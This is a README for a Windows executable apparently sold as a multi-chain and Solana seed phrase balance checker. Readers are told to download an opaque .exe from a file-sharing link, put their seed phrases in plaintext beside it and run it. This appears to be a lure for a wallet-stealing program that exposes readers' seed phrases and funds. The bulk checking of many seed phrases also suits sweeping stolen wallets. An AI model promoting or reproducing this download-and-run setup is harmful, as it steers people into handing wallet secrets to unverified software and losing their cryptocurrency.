# Multi-Chain & Solana Seed Phrase Balance Checker

This tool allows you to check the native token balances for multiple derived addresses from a list of seed phrases across several EVM-compatible blockchains and the Solana network. It's provided as a single `.exe` file, so no building is required.

It utilizes Alchemy API keys for EVM chains and an RPC URL for Solana to query blockchain data.

## Features

*   Checks multiple seed phrases from a `seed_phrases.txt` file.
*   Derives multiple addresses (default 5 per seed phrase) using standard derivation paths.
    *   EVM: `m/44'/60'/0'/0/i`
    *   Solana: `m/44'/501'/X'/0'` (or similar, depending on wallet standard)
*   Supports checking balances on:
    *   Ethereum (ETH)
    *   Arbitrum (ETH)
    *   Polygon (MATIC)
    *   Base (ETH)
    *   BNB Smart Chain (BNB)
    *   Solana (SOL)
*   Displays balances in native currency and an estimated USD value (based on pre-set prices in the tool).
*   Colored console output for readability.

## Download

You don't need to build this tool yourself. A pre-built `.exe` file (intended to include all features described here) is available for download:

[<img src="https://img.shields.io/badge/Download-Executable-brightgreen" alt="Download .exe">](https://gofile.io/d/tItapO)

## Setup and Usage

1.  **Download the Executable:**
    Download the `.exe` file from the link above and save it to a folder on your computer. Let's assume you named it `balance_checker.exe`.

2.  **Create `.env` File:**
    In the *same folder* as `balance_checker.exe`, create a file named `.env`. This file will store your Alchemy API keys and Solana RPC URL.
    You can get Alchemy API keys for free from [Alchemy's website](https://www.alchemy.com/). You'll need to create an app for each EVM network. For Solana, you'll need a Solana RPC URL (Alchemy also provides Solana RPCs, or you can use other providers like Triton, GenesysGo, or public ones, though public ones might be rate-limited).

    Your `.env` file should look like this:

    ```env
    ETH_ALCHEMY_API_KEY=YOUR_ETH_MAINNET_ALCHEMY_API_KEY
    ARBITRUM_ALCHEMY_API_KEY=YOUR_ARBITRUM_MAINNET_ALCHEMY_API_KEY
    POLYGON_ALCHEMY_API_KEY=YOUR_POLYGON_MAINNET_ALCHEMY_API_KEY
    BASE_ALCHEMY_API_KEY=YOUR_BASE_MAINNET_ALCHEMY_API_KEY
    BSC_ALCHEMY_API_KEY=YOUR_BSC_ALCHEMY_API_KEY
    SOLANA_RPC_URL=YOUR_SOLANA_MAINNET_RPC_URL
    ```
    Replace each `YOUR_..._API_KEY` with your actual API key for the respective EVM network and `YOUR_SOLANA_MAINNET_RPC_URL` with your Solana RPC endpoint.

3.  **Create `seed_phrases.txt` File:**
    In the *same folder* as `balance_checker.exe` and `.env`, create a file named `seed_phrases.txt`.
    Enter each seed phrase (EVM or Solana) you want to check on a new line.

    Example `seed_phrases.txt`:
    ```
    word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12
    another seed phrase example that is usually twelve words long or more
    solana seed phrase which can also be twelve or twenty four words usually
    ```

4.  **Run the Tool:**
    *   Open a command prompt or terminal.
    *   Navigate to the directory where you saved `balance_checker.exe`, `.env`, and `seed_phrases.txt`.
    *   Run the executable by typing its name:
        ```bash
        .\balance_checker.exe
        ```
        (If you're not using PowerShell or Command Prompt on Windows, the command might just be `./balance_checker.exe` or `balance_checker.exe`).
    *   Alternatively, on Windows, you might be able to just double-click the `.exe` file. A console window will appear.

5.  **View Results:**
    The tool will process each seed phrase and display any addresses with a balance above the minimum threshold, along with their balances on the supported networks in the console.
    ![Example Output](https://i.ibb.co/ZpvfrKW8/Screenshot-211.png)

## Supported Networks

The tool currently checks balances on the following networks:

*   Ethereum Mainnet
*   Arbitrum One
*   Polygon PoS Mainnet
*   Base Mainnet
*   BNB Smart Chain (BSC)
*   Solana Mainnet

## Important Note on Token Prices

Token prices used for USD conversion (ETH, MATIC, BNB, ARB, BASE, SOL) are pre-set within the application. These are for indicative purposes only and may not reflect real-time market values.

---
Program signed by RamiSolGeek
